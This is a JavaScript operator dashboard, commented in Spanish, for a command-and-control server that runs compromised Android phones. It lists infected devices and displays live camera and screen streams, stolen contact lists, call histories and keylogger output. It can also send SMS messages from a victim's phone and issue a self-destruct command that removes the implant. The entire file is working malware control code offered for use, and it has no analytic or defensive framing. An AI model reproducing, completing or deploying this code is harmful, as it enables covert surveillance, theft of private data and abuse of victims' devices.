/**
 * C2 Operator Main Logic
 * Maneja la comunicación Socket.io, el streaming y el visor de datos.
 */

const socket = io();
window.currentAgentId = null;

// --- 1. GESTIÓN DE CONEXIÓN Y AGENTES ---

socket.on('connect', () => {
    log("Conexión establecida con el C2 Server.");
});

socket.on('update-agent-list', (agents) => {
    const listContainer = document.getElementById('agent-list');
    listContainer.innerHTML = '';
    
    Object.keys(agents).forEach(sid => {
        const agent = agents[sid];
        const div = document.createElement('div');
        div.className = `agent-item ${window.currentAgentId === sid ? 'selected' : ''}`;
        div.innerHTML = `
            <b>📱 ${agent.deviceInfo.model || 'Desconocido'}</b><br>
            <small>ID: ${sid.substring(0, 10)}...</small><br>
            <small style="color: #888;">Android: ${agent.deviceInfo.android || '?'}</small>
        `;
        div.onclick = () => selectAgent(sid, div);
        listContainer.appendChild(div);
    });
});

function selectAgent(sid, element) {
    window.currentAgentId = sid;
    // UI Update
    document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('selected'));
    element.classList.add('selected');
    log(`Objetivo seleccionado: ${sid}`);
}

// --- 2. STREAMING Y MONITOREO (Cámara/Pantalla) ---

socket.on('update-monitor', (base64Data) => {
    const monitor = document.getElementById('video-feed');
    const overlay = document.querySelector('.overlay-text');
    
    if (monitor) {
        monitor.src = "data:image/jpeg;base64," + base64Data;
        overlay.innerText = "🔴 LIVE FEED ACTIVE";
        overlay.classList.add('live-active');
    }
});

// --- 3. RECEPCIÓN DE DATOS Y LOGS ---

socket.on('dashboard-log', (message) => {
    log(message);
});

// Recepción de Contactos
socket.on('dashboard-contacts', (data) => {
    showTable("CONTACTOS EXTRAÍDOS", ["Nombre", "Teléfono"], data, (item) => `
        <tr>
            <td>${item.name || 'Sin nombre'}</td>
            <td>${item.number || 'Sin número'}</td>
        </tr>
    `);
});

// Recepción de Llamadas
socket.on('dashboard-calls', (data) => {
    showTable("HISTORIAL DE LLAMADAS", ["Número", "Tipo", "Duración"], data, (item) => `
        <tr>
            <td>${item.number}</td>
            <td>${item.type}</td>
            <td>${item.duration}s</td>
        </tr>
    `);
});

// Recepción de Keylogger
socket.on('data-keylogger', (data) => {
    log(`⌨️ Tecla: ${data.key}`);
});

// --- 4. FUNCIONES DE CONTROL (COMANDOS) ---

/**
 * Envía un comando al servidor para el agente seleccionado
 */
function cmd(action, extraParams = {}) {
    if (!window.currentAgentId) {
        alert("⚠️ Error: Debes seleccionar un agente de la lista izquierda.");
        return;
    }
    
    log(`Enviando orden: [${action.toUpperCase()}]...`);
    socket.emit('control-command', {
        target: window.currentAgentId,
        command: { type: action, ...extraParams }
    });
}

function sendSMS() {
    const phone = document.getElementById('sms-number').value;
    const msg = document.getElementById('sms-msg').value;
    
    if (!phone || !msg) return alert("Llena número y mensaje");
    
    cmd('send_sms', { phone: phone, message: msg });
    document.getElementById('sms-msg').value = ''; // Limpiar campo
}

// --- 5. VISOR DE TABLAS (UI) ---

function showTable(title, headers, items, rowTemplate) {
    const viewer = document.getElementById('data-viewer');
    viewer.style.display = 'block';
    document.getElementById('viewer-title').innerText = title;
    
    const thead = document.getElementById('table-head');
    thead.innerHTML = `<tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr>`;
    
    const tbody = document.getElementById('table-body');
    if (items.length === 0) {
        tbody.innerHTML = '<tr><td colspan="100%" style="text-align:center;">No hay datos disponibles</td></tr>';
    } else {
        tbody.innerHTML = items.map(item => rowTemplate(item)).join('');
    }
    
    log(`Tabla cargada: ${title} (${items.length} entradas)`);
    viewer.scrollIntoView({ behavior: 'smooth' });
}

function closeViewer() {
    document.getElementById('data-viewer').style.display = 'none';
}

// --- 6. UTILIDADES ---

function log(text) {
    const terminal = document.getElementById('terminal');
    if (!terminal) return;
    
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${text}`;
    terminal.prepend(entry);
}

// Comando de Autodestrucción
function selfDestruct() {
    if (confirm("⚠️ ¿Estás seguro? Esto eliminará la app del objetivo y perderás acceso.")) {
        cmd('self_destruct');
    }
}
